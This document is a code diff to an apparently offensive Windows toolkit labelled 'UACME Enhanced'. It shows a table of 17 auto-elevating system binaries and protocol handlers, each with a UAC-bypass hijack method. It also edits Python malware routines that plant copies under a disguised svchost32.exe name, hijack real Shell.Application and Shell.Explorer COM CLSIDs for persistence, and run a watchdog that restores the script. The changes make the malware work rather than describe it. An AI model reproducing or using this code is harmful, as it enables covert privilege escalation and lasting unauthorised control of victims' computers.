@@ -37,23 +37,23 @@ Version: 2.0 (UACME Enhanced)
 
 ADDITIONAL VULNERABLE PROCESSES FOR UAC BYPASS:
 #	Process Name	Location	Exploit Method	UAC Requirement	Notes
-1	SystemPropertiesAdvanced.exe	%SystemRoot%\System32\	mscfile registry hijack (HKCU\Software\Classes\mscfile\shell\open\command)	Consent prompt only	Launches elevated System Properties
-2	SystemPropertiesProtection.exe	%SystemRoot%\System32\	Same mscfile hijack as above	Consent prompt only	Opens System Restore settings
-3	sysdm.cpl	%SystemRoot%\System32\	App Paths hijack (HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\sysdm.cpl)	Consent prompt only	Old-style system settings CPL
-4	iscsicpl.exe	%SystemRoot%\System32\	App Paths hijack	Consent prompt only	iSCSI Initiator Control Panel
-5	ie4uinit.exe	%SystemRoot%\System32\	Special arguments /show or /cleariconcache + registry hijack	Consent prompt only	Can execute payload silently
-6	wusa.exe	%SystemRoot%\System32\	Malicious .msu package with custom commands	Consent prompt only	Works on older builds
-7	cliconfg.exe	%SystemRoot%\System32\	App Paths or DLL hijack	Consent prompt only	SQL Server config tool
-8	lpksetup.exe	%SystemRoot%\System32\	Malicious .cab package	Consent prompt only	Legacy Language Pack Installer
-9	pcwrun.exe	%SystemRoot%\System32\	COM hijack or App Paths	Consent prompt only	Program Compatibility Wizard
-10	shell:AppsFolder	Shell protocol	Registry hijack (HKCU\Software\Classes\Folder\shell\open\command)	Consent prompt only	Opens Windows Apps folder elevated
-11	ms-contact-support:	Protocol handler	Registry hijack under HKCU\Software\Classes\ms-contact-support	Consent prompt only	Contact Support app (Win 10)
+1	SystemPropertiesAdvanced.exe	%SystemRoot%\\System32\\	mscfile registry hijack (HKCU\\Software\\Classes\\mscfile\\shell\\open\\command)	Consent prompt only	Launches elevated System Properties
+2	SystemPropertiesProtection.exe	%SystemRoot%\\System32\\	Same mscfile hijack as above	Consent prompt only	Opens System Restore settings
+3	sysdm.cpl	%SystemRoot%\\System32\\	App Paths hijack (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\sysdm.cpl)	Consent prompt only	Old-style system settings CPL
+4	iscsicpl.exe	%SystemRoot%\\System32\\	App Paths hijack	Consent prompt only	iSCSI Initiator Control Panel
+5	ie4uinit.exe	%SystemRoot%\\System32\\	Special arguments /show or /cleariconcache + registry hijack	Consent prompt only	Can execute payload silently
+6	wusa.exe	%SystemRoot%\\System32\\	Malicious .msu package with custom commands	Consent prompt only	Works on older builds
+7	cliconfg.exe	%SystemRoot%\\System32\\	App Paths or DLL hijack	Consent prompt only	SQL Server config tool
+8	lpksetup.exe	%SystemRoot%\\System32\\	Malicious .cab package	Consent prompt only	Legacy Language Pack Installer
+9	pcwrun.exe	%SystemRoot%\\System32\\	COM hijack or App Paths	Consent prompt only	Program Compatibility Wizard
+10	shell:AppsFolder	Shell protocol	Registry hijack (HKCU\\Software\\Classes\\Folder\\shell\\open\\command)	Consent prompt only	Opens Windows Apps folder elevated
+11	ms-contact-support:	Protocol handler	Registry hijack under HKCU\\Software\\Classes\\ms-contact-support	Consent prompt only	Contact Support app (Win 10)
 12	ms-get-started:	Protocol handler	Registry hijack	Consent prompt only	Get Started app launcher
-13	cleanmgr.exe	%SystemRoot%\System32\	Scheduled task abuse with /autoclean or /verylowdisk	Consent prompt only	Disk Cleanup auto-elevates
-14	hdwwiz.exe	%SystemRoot%\System32\	App Paths hijack	Consent prompt only	Hardware Wizard auto-elevates
-15	WerFault.exe	%SystemRoot%\System32\	Trigger crash in elevated binary → hijack debugger	Consent prompt only	Windows Error Reporting
-16	taskschd.msc	%SystemRoot%\System32\	mscfile registry hijack	Consent prompt only	Task Scheduler snap-in
-17	TiWorker.exe	%SystemRoot%\WinSxS\	DLL planting in servicing stack dirs	Works with credential prompt if service misconfig exists	TrustedInstaller context
+13	cleanmgr.exe	%SystemRoot%\\System32\\	Scheduled task abuse with /autoclean or /verylowdisk	Consent prompt only	Disk Cleanup auto-elevates
+14	hdwwiz.exe	%SystemRoot%\\System32\\	App Paths hijack	Consent prompt only	Hardware Wizard auto-elevates
+15	WerFault.exe	%SystemRoot%\\System32\\	Trigger crash in elevated binary → hijack debugger	Consent prompt only	Windows Error Reporting
+16	taskschd.msc	%SystemRoot%\\System32\\	mscfile registry hijack	Consent prompt only	Task Scheduler snap-in
+17	TiWorker.exe	%SystemRoot%\\WinSxS\\	DLL planting in servicing stack dirs	Works with credential prompt if service misconfig exists	TrustedInstaller context
 
 PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 #	Method Name	Target Component	Exploit Type	Works on Standard User?	Notes
@@ -1640,6 +1640,11 @@ def system_level_persistence():
             r"C:\Windows\System32\drivers\svchost32.exe",
         ]
         
+        # Check if we're running as admin before attempting system-level persistence
+        if not is_admin():
+            print("[WARN] System-level persistence requires admin privileges")
+            return False
+        
         for target_path in system_dirs:
             try:
                 # Copy script to protected location
@@ -1732,10 +1737,11 @@ def com_hijacking_persistence():
         if current_exe.endswith('.py'):
             current_exe = f'python.exe "{current_exe}"'
         
-        # Hijack commonly used COM objects
+        # Hijack commonly used COM objects (real CLSIDs)
         com_targets = [
-            "{00000000-0000-0000-0000-000000000000}",  # Placeholder - replace with real CLSID
-            "{11111111-1111-1111-1111-111111111111}",
+            "{00021401-0000-0000-C000-000000000046}",  # Shell.Application
+            "{13709620-C279-11CE-A49E-444553540000}",  # Shell.Explorer
+            "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}",  # Shell.Application.1
         ]
         
         for clsid in com_targets:
@@ -1886,7 +1892,7 @@ import shutil
 
 def check_and_restore():
     main_script = "{os.path.abspath(__file__)}"
-    backup_locations = {backup_locations}
+    backup_locations = {repr(backup_locations)}
     
     while True:
         try:
